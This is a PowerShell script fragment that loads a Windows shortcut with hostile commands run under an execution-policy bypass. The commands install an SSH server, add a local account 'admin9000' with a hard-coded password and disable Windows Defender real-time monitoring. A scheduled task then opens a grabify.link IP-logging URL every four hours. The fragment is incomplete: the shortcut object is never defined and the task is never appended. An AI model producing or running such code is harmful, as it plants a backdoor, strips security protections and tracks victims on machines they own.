$TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Arguments = "-ExecutionPolicy Bypass -Command"

# Installing SSH
$SSHCommand = "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
$Shortcut.Arguments += "; $SSHCommand"

# Adding a user and setting the password
$UserCommand = "net user admin9000 admin10000 /add"
$Shortcut.Arguments += "; $UserCommand"

# Disabling Windows Defender
$DefenderCommand = "Set-MpPreference -DisableRealtimeMonitoring $true"
$Shortcut.Arguments += "; $DefenderCommand"

# Setting up a scheduled task to open Google Chrome with a website every 4 hours
$TaskCommand = "Register-ScheduledTask -TaskName OpenWebsiteTask -Action (New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\Application\chrome.exe' -Argument 'https://grabify.link/DHU0MR') -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 4))"

